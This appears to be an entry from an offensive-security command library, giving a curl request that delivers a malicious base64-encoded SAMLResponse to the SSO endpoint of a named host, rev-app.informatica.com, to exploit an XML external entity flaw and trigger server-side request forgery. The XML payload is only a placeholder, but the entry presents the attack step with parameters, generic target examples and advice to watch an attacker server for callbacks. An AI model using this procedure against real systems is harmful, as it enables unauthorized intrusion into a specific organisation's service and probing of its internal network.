---
data: >-
  curl -X POST 'https://rev-app.informatica.com/sso' -H 'Host:
  rev-app.informatica.com' -H 'Content-Type: application/x-www-form-urlencoded'
  --data 'SAMLResponse=<base64-encoded-XML>&RelayState='
tags:
  - http
  - post
  - xxe
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 67c31556-e0cf-49b1-89ee-dfa24ebaa222
created_at: '2025-12-13T09:01:26.344Z'
updated_at: '2025-12-13T09:01:26.344Z'
verified: false
validated: true
submitted: true
---
# curl-post-saml-xxe

## Command

```bash
curl -X POST 'https://rev-app.informatica.com/sso' \
  -H 'Host: rev-app.informatica.com' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data 'SAMLResponse=<base64-encoded-XML>&RelayState='
```

## Description

This command sends a malicious SAMLResponse via POST to exploit an XXE vulnerability in the SSO endpoint, triggering SSRF. Use it after crafting and base64-encoding the XML payload.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-X POST` | Specifies POST method | Yes |
| `-H 'Host: ...'` | Sets the Host header | Yes |
| `-H 'Content-Type: ...'` | Sets the content type | Yes |
| `--data 'SAMLResponse=...'` | The request body with base64 payload | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://target.com/sso' -H 'Host: target.com' -H 'Content-Type: application/x-www-form-urlencoded' --data 'SAMLResponse=base64payload&RelayState='
```

### Advanced Usage

```bash
curl -X POST 'https://target.com/sso' -H 'Host: target.com' -H 'Content-Type: application/x-www-form-urlencoded' -H 'User-Agent: Custom' --data 'SAMLResponse=base64payload&RelayState=state'
```

## Expected Output

HTTP response from the server; monitor attacker's server for SSRF callback requests indicating successful exploitation.

## Related

- [[procedures/Craft-Malicious-XXE-Payload-in-SAMLResponse]]
- [[procedures/Send-Malicious-SAMLResponse-to-SSO-Endpoint]]
